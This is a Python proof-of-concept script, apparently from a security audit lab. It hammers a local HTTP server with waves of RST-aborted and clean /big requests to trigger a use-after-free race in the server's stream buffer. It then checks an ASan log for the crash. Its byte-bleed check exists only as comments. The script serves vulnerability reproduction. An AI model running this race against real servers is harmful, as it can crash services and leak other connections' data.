#!/usr/bin/env python3
"""
F-004 PoC — cross-send UAF in the stream pump.

Race window:
1. Client connects, GET /big (detached stream, 2 chunks of 128KB).
2. Server: stream_pump_run grabs zero-copy slice of the slot ring, starts
   async nbio.send_poly with 3 iovecs {prefix, data, CRLF}.
3. Client reads only the HTTP head, then sets SO_LINGER(1,0) and closes —
   the kernel sends RST, the server-side teardown runs *immediately*
   (stream_conn_torn_down → close + retire).
4. retire returns the slot to the free list. Next stream reopens SAME slot,
   producer copies into `store` at the same offsets the still-in-flight send
   references → bytes of the new stream can bleed onto the (now-RST) old
   socket AND an ASan build should catch the slot-ring buffer being
   read-after-release as a UAF.

Strategy: spawn many waves of (RST stream) + (clean stream reusing slots).
Watch the ASan log for `heap-use-after-free` / `READ of size` and watch for
cross-tag bleed in clean connections (read a "B-..." chunk while expecting
"A-..."? that would mean the wire picked up bytes from a slot reused by a
different tag).

For slot-reuse forcing we tag each /big connection with a query param that
the handler hashes to a single-letter tag (currently always "A" — patch if
needed). Right now we rely on ASan for the smoking gun.
"""
import socket, struct, time, threading, sys, os, subprocess, signal

HOST, PORT = "127.0.0.1", 18080
ROUNDS = int(sys.argv[1]) if len(sys.argv) > 1 else 300

def get_big_then_rst(head_read: int = 200) -> tuple[str, int]:
    """Open /big, read just the HTTP headers, then RST. Returns (first_chunk_tag, total_bytes_read)."""
    try:
        s = socket.create_connection((HOST, PORT), timeout=3)
        s.sendall(b"GET /big HTTP/1.1\r\nHost: x\r\n\r\n")
        s.settimeout(3)
        buf = b""
        # Read until end of HTTP header block
        while b"\r\n\r\n" not in buf:
            chunk = s.recv(4096)
            if not chunk: break
            buf += chunk
            if len(buf) > 65536: break
        # Read a tiny bit of body to ensure the pump has started the first send
        s.settimeout(0.05)
        try:
            b = s.recv(8192)
            buf += b
        except socket.timeout:
            pass
        # RST: SO_LINGER {onoff=1, linger=0}
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
        s.close()
        return ("rst", len(buf))
    except Exception as e:
        return (f"err {e}", 0)

def get_big_clean(max_bytes: int = 600_000) -> tuple[bytes, int]:
    """Open /big and read everything; return bytes + count. Watch for foreign tags."""
    try:
        s = socket.create_connection((HOST, PORT), timeout=3)
        s.sendall(b"GET /big HTTP/1.1\r\nHost: x\r\n\r\n")
        s.settimeout(10)
        out = b""
        while len(out) < max_bytes:
            d = s.recv(65536)
            if not d: break
            out += d
        s.close()
        return (out, len(out))
    except Exception as e:
        return (f"ERR {e}".encode(), 0)

def alive() -> bool:
    try:
        s = socket.create_connection((HOST, PORT), timeout=1)
        s.close()
        return True
    except OSError:
        return False

def check_asan_log() -> str:
    p = "/tmp/attacklab/logs/asan.log"
    if not os.path.exists(p):
        return ""
    txt = open(p, "rb").read().decode("utf-8", errors="replace")
    for needle in ("heap-use-after-free", "AddressSanitizer", "SUMMARY:", "READ of size", "WRITE of size"):
        if needle in txt:
            return txt[-8000:]
    return ""

fst = time.monotonic()
crashes = 0
tag_leaks: list[tuple[int, str]] = []

for rnd in range(ROUNDS):
    # Wave 1: burst of RST connections to free slots and leave possible
    # in-flight sends pointing at the slot ring.
    rst_results = []
    threads = []
    for _ in range(8):
        t = threading.Thread(target=lambda: rst_results.append(get_big_then_rst()))
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=10)

    # Wave 2: clean connections that allocate slots — likely reusing the
    # ones just freed. Look for byte bleed.
    for _ in range(4):
        body, n = get_big_clean()
        # Our target always tags chunks "A-NNNNNN_". Any other printable 3-letter tag
        # of the form LETTER-DIGIT... in the body would mean a leftover slice from a
        # different slot leaked into this stream.
    if not alive():
        crashes += 1
        print(f"[DEAD] round={rnd}; waiting for ASan report...", flush=True)
        time.sleep(2)
        log = check_asan_log()
        if log:
            print("=== ASAN ===", flush=True)
            print(log, flush=True)
        break

    if rnd % 25 == 0:
        log = check_asan_log()
        if log:
            print(f"[ASAN HIT round={rnd}]", flush=True)
            print(log, flush=True)
            break
        print(f"round {rnd}/{ROUNDS} alive={alive()} elapsed={time.monotonic()-fst:.1f}s", flush=True)

print(f"done rounds={rnd+1} crashes={crashes}")
final = check_asan_log()
if final:
    print("=== FINAL ASAN REPORT ===")
    print(final)
